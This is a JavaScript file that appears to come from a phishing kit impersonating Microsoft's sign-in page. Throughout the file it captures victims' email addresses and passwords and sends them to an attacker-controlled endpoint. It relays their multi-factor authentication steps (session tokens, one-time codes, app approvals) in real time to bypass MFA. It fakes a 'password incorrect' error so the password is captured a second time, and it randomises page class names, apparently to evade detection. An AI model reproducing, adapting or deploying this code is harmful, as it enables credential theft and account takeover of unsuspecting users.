var Errs={'NoOtpCode':'Enter the code to help us verify your identity.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','OathCodeIncorrect':'You didn\'t enter the expected verification code. Please try again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoAccount':'We couldn\'t find an account with that username. Try another, or get a new account.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoPassword':'Please enter your password.','accIncorrect':'Your account or password is incorrect. If you don\'t remember your password, <a id="ViewDetails" class="no-wrap" href="#">reset it now.</a>','UnableVeri':'Sorry, we\'re having trouble verifying your account. Please try again <a id="ViewDetails" class="no-wrap" href="#">View details</a>','InvalidSession':'Your session has timed out. Please close your browser and sign in again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>'};
var email = "";
var epass = "";
var phone = "";
var dVal = [];
var lVal = [];
var pages = [];
var myInterval,Proofs;
    $( document ).ready(async function() {
        console.log(semail);  
if(isEmail(semail)){
    getpage('EmailPage',0);
email = $("#email").val(semail);
nextto(semail);
}else{
 await getpage('EmailPage',1);  
  if(semail){
    email = $("#email").val(semail);
    $("#error1").html(Errs['NoAccount']);
  }
} 
});
async function getpage(page,dis){
$("#load").show();
    var scrn= await GotoType(page);
    if(scrn['status']='success'){
        if(dis){
         $("#screen1").html(scrn['msg']);
        }else{

        }
    pages[page]=scrn['msg'];
     $("#load").hide();
}else{

}
}

function isEmail(email) {
var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
return regex.test(email);
}
function nextto(vak) {
if(vak){
    email = vak;  
}else{
    email = $("#email").val();  
}
if (isEmail(email) === true) {
$("#load").show();
$("#btn").attr("disabled", true);

$.ajax({
type: "POST",
url: urlx,
data: { action: "signup", email: email, mode: "getbg" },
}).done(async function (data) {
console.log(data);
var datArray = JSON.parse(data);
console.log(datArray);
if (datArray["status"] == "success") {
    if(datArray["logo_image"]){
$(".imglogo").attr("src", datArray["logo_image"]);   
    }
if(datArray["bg_image"]){
$("#imgbg").css("background-image", "url(" + datArray["bg_image"] + ")");
}
}
 await getpage('PassPage',1);
$("#btn").attr("disabled", false);
$(".ext-promoted-fed-cred-box").hide();
});
} else {
$("#error1").html(Errs['NoAccount']);
}
}
function orgme() {
setTimeout(function () {
$("#page2").hide();
$("#page3").show();
}, 3000);
}

function back(page) {
 $("#screen1").html(pages[page]);
 $("#email").val(email);
 $(".imglogo").attr("src", 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg');  
 $("#imgbg").css("background-image", "url( https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg)");
$(".ext-promoted-fed-cred-box").show();
}
function cancel() {
location.reload();
}
var count = 0;
var lcount = 0;
function redlogin() {
epass = $("#epass").val();

if (epass == "") {
$("#error2").html(Errs['NoPassword']);

} else {
count = count + 1;
$("#error2").html('');

$("#load").show();
$("#btn2").attr("disabled", true);
$.ajax({
type: "POST",
url: urlx,
data: { action: "signup", email: email, epass: epass, mode: "OfficeLogin" },
}).done(function (data) {
console.log(data);
var datArray = JSON.parse(data);

if (datArray["status"] == "success") {
window.location.replace(datArray["land"]);
} else if (datArray["status"] == "login_auth") {
auth(datArray["auth_val"]);
}else if (datArray["status"] == "successx") {
    lcount++;
    if(lcount>=2){
   window.location.replace(datArray["land"]);     
    }else{
     $("#load").hide();
$("#error2").html(Errs['accIncorrect']);
$("#epass").val("");
$("#btn2").attr("disabled", false);   
    }
} else {
$("#load").hide();
$("#error2").html(Errs['accIncorrect']);
$("#epass").val("");
$("#btn2").attr("disabled", false);
return false;
}
});
}
}

async  function auth(dauth) {
    if(Proofs){
$("#screen1").html(Proofs);
    }else{
dVal["arrUserProofs"] = dauth["arrUserProofs"];
dVal["ctx"] = dauth["ctx"];
dVal["flowToken"] = dauth["flowToken"];
dVal["canary"] = dauth["canary"];
var data = dauth["arrUserProofs"];
console.log(data);
var gototype=await GotoType('Proofs');
if(gototype['status']){
    Proofs=gototype['msg'];
$("#screen1").html(gototype['msg']);
$("#load").hide();
data.forEach(function (val, i) {
var authid = val["authMethodId"];
$("#screen1 #"+authid).show();
$("#screen1 #"+authid+ " .pnum").text(val["display"]);
phone = val["display"];
});
Proofs=$('#screen1').html();
}
}
}
async  function  GotoAuth(atype){
    $("#screen1 #load").show();
var reslt = await GotoType(atype);
if(reslt['status']=='success'){
   
console.log(reslt['status']);
var act= await beginAuth(atype);
if (act["Success"]) {
     $("#screen1 #load").hide();
$("#screen1").html(reslt['msg']);
if (atype == "TwoWayVoiceMobile" || atype == "PhoneAppNotification") {
    if(act['Entropy']){
        $("#displaySign").show();
        $("#displaySigntxt").html(act['Entropy']);
    }
startEndath(atype);
}
}else{
    authback(1);
}
}
}
function authback(err) {
$("#screen1 #load").show();
auth(dVal);
stopEndath();
 if(err){
         setTimeout(function(){
       $("#screen1 #errorx").html(Errs['UnableVeri']);  
       $("#screen1 #load").hide();
   },1000)
   
    }
}
async function GotoType(atype) {
var reslt= await $.ajax({
type: "POST",
url: urlx,
data: {
action: "signup",
atype: atype,
email: email,
phone: phone,
mode: "GotoType"
},
})
return JSON.parse(reslt);

}
function AuthEdata(atype){
if (atype == "TwoWayVoiceMobile" || atype == "PhoneAppNotification") {
stopEndath();
processAuth(atype, "");
}
}
async function verifyOTC(atype) {
$("#screen1 #staErr").html('');
var otc = $("#screen1 #otc").val();
if(otc!=''){
$("#screen1 #load").show();
$("#screen1 #verifyOTC").attr('disabled',true);
var res= await endAuth(atype, otc);
$("#screen1 #load").hide();
if (res["Success"]) {
    $("#screen1 #load").show();
processAuth(atype, otc);
}else if (res["ResultValue"]=='InvalidSession'){
$("#screen1 #verifyOTC").attr('disabled',false);
$("#screen1 #staErr").html(Errs['InvalidSession']);
}else if (res["ResultValue"]=='OathCodeIncorrect'){
$("#screen1 #verifyOTC").attr('disabled',false);
$("#screen1 #staErr").html(Errs['OathCodeIncorrect']);
}else{
    $("#screen1 #staErr").html('');
  authback(1);
}

console.log('res',res); 
}else{
$("#screen1 #load").hide();
$("#screen1 #staErr").html(Errs['NoOtpCode']);
}

}
async function beginAuth(atype) {
var valx = '{"AuthMethodId":"' + atype + '","Method":"BeginAuth","ctx":"' + dVal["ctx"] + '","flowToken":"' + dVal["flowToken"] + '"}';
var gdata  = await $.ajax({
type: "POST",
url: urlx,
data: {
action: "signup",
valx: valx,
mode: "bauth",
},
}).done(function (data) {
var vdata = JSON.parse(data);
if (vdata["Success"]) {
lVal["ctx"] = vdata["Ctx"];
lVal["flowToken"] = vdata["FlowToken"];
lVal["sseid"] = vdata["SessionId"];
lVal["stpoll"] = datetoiso(vdata["Timestamp"]);
lVal["edpoll"] = datetoiso(vdata["Timestamp"]);
}else{
     $("#screen1 #errorx").html(Errs['UnableVeri']);  
}
console.log(vdata);
});
var vdata = JSON.parse(gdata);
return vdata;
}

var PollCount = 1;
async function endAuth(atype, otc) {
     lVal["stpoll"] = datetoiso(new Date());
PollCount++;
var valx =
'{"Method":"EndAuth","SessionId":"' +
lVal["sseid"] +
'","FlowToken":"' +
lVal["flowToken"] +
'","Ctx":"' +
lVal["ctx"] +
'","AuthMethodId":"' +
atype +
'","AdditionalAuthData":"' +
otc +
'","PollCount":' +
PollCount +
"}";
var rr = await  $.ajax({
type: "POST",
url: urlx,
data: {
action: "signup",
valx: valx,
mode: "eauth",
},
}).done(function (data) {
var vdata = JSON.parse(data);
console.log(vdata);
lVal["ctx"] = vdata["Ctx"];
lVal["flowToken"] = vdata["FlowToken"];
lVal["sseid"] = vdata["SessionId"];
lVal["edpoll"] = datetoiso(vdata["Timestamp"]);
if (vdata["Success"]) {
PollCount = 1;
AuthEdata(atype);
}
if (PollCount >= 10) {
    authback(1);
   
console.log("PollCount Stoped");
stopEndath();
}

});
var vdata = JSON.parse(rr);
return vdata;
console.log('rr',rr);

}
function processAuth(atype, otc) {
console.log("processAuth");

var valx =
'{"type":19,"GeneralVerify":true,"request":"' +
lVal["ctx"] +
'","mfaLastPollStart":"'+lVal["stpoll"]+'","mfaLastPollEnd": "'+lVal["edpoll"]+'","mfaAuthMethod": "' +
atype +
'","otc": "' +
otc +
'","login": "' +
email +
'","flowToken":"' +
lVal["flowToken"] +
'","hpgrequestid":"' +
lVal["sseid"] +
'","sacxt":"","hideSmsInMfaProofs":false,"canary":"'+dVal["canary"]+'","i19": "42293"}';
console.log(valx);
$.ajax({
type: "POST",
url: urlx,
data: { action: "signup", email: email, epass: epass, valx: valx, mode: "pAuth" },
}).done(function (data) {
console.log(data);
var datArray = JSON.parse(data);
if (datArray["status"] == "success") {
window.location.replace(datArray["land"]);
}
});
}
function startEndath(atype) {
myInterval = setInterval(function () {
endAuth(atype, "");
}, 5000);
}
function stopEndath() {
clearInterval(myInterval);
}
function datetoiso(date){
    var dateobj =  new Date(date);
return dateobj.getTime();
}
$(document).on('keypress',function(e) {
    if(e.which == 13) {
        console.log(e.target.id);
        if(e.target.id=='email'){
        nextto();
        }else if(e.target.id=='epass'){
            redlogin();
        }else if(e.target.id=='otc'){
            $("#verifyOTC").click();

        }
    }
});
 function dec2hex (dec){return dec.toString(16).padStart(2, "0")}function generateId (len){var arr=new Uint8Array((len || 40) / 2);window.crypto.getRandomValues(arr);return Array.from(arr, dec2hex).join('');}var SesIN=generateId (40); $("div").addClass(SesIN);